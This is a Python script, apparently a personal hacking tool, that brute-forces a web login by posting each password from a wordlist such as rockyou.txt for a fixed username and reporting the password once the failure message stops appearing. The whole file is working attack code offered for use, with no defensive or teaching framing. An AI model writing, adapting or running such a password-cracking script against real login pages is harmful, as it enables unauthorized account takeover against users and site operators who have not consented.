import requests
import sys

def Cracker(url,identifier,file):
    f = open(file,"rb")
    line = f.readlines()
    for line in line:
        data = {"username":"alis","password":f"{line.decode()}"}
        r = requests.post(url,data=data)
        res_text = r.text
        if identifier not in res_text:
            print("PASSWORD IS CRACKED SUCCESFULLY!")
            sys.stdout.write("(+) password =>"+"\r"+ f"{line.decode()}")
            sys.stdout.flush()
            break
        else:
            print("Password =>"+line.decode())
            sys.stdout.write("\033[F")
            sys.stdout.flush()


def main():
    if len(sys.argv) != 4:
        print("(+) Usage: %s <url> <identifier> <file_name>" % sys.argv[0])
        print("(+) Example: %s www.example.com Invalid password rockyou.txt"% sys.argv[0])
    
    url = sys.argv[1]
    identifier = sys.argv[2] 
    file = sys.argv[3]
    print("(+) Retrieving password.....")
    Cracker(url,identifier,file)
    
        
if __name__ == "__main__":
    main()
    